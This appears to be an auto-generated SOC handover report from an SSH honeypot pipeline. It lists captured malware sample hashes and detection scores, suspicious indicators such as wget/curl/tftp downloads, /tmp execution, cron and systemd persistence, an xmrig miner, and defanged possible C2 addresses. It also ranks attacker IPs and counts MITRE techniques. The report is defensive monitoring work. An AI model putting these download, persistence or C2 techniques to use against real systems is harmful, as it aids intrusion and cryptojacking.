| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.132.186[.]192` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `20.65.144[.]189` | US | Microsoft Corporation | **100** ⚠️ | 10 |
| `35.210.7[.]122` | BE | Google LLC | **100** ⚠️ | 5 |
| `49.251.137[.]156` | JP | JCOM Co., Ltd. | **100** ⚠️ | 50 |
| `23.132.164[.]185` | DE | 10GIG.HOST | **100** ⚠️ | 24 |
| `156.225.1[.]108` | HK | AGOTOZ PTE. LTD | **100** ⚠️ | 15 |
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `74.207.243[.]103` | US | Linode | **100** ⚠️ | 2 |
| `77.239.124[.]130` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 50 |
| `193.32.162[.]84` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 193 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 172 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 90 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 58 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 58 |

---

## 🔕 False Positive Summary (61 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 26 |
| AbuseIPDB score 1 below threshold 25 | 4 |
| AbuseIPDB score 12 below threshold 25 | 2 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 4 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 7 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 332 cases |
| Tool 34  | Credential Extractor        | ✅ 394 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 27 fingerprints |
| Tool 36  | Command Clustering          | ✅ 71 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 171 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 61 filtered (18.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 84 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 166 priority case(s) shown individually · 89 recon entry/entries in table (10 group(s) consolidating 26 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-06T18:41:46Z_
